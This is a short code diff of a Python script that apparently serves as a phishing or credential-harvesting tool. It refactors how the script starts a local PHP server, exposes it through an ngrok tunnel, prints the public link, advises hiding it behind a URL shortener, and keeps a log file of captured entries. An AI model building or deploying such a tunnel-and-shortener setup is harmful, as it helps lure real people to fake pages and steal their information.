@@ -41,16 +41,17 @@ def program():
     log = open("log.txt", "r").read()
     print(log)
 
+  def start_process():
+    os.popen("php -q -S localhost:8080")
+    ngrok.connect(8080, bind_tls=True)
+
   print(banner)
   log = open("log.txt", "w")
   log.write(" New Log : ")
   log.close()
   print("Starting...")
-  os.popen("php -q -S localhost:8080")
-  os.system(clear)
-  ngrok.connect(8080, bind_tls=True)
-  url = ngrok.get_tunnels()
-  print(url)
+  start_process()
+  print(ngrok.get_tunnels())
   print("You can use a Url Shortener's like bit.ly")
   print("Please copy the link")
   input("[ PRESS ANY KEY TO CONTINUE ]")
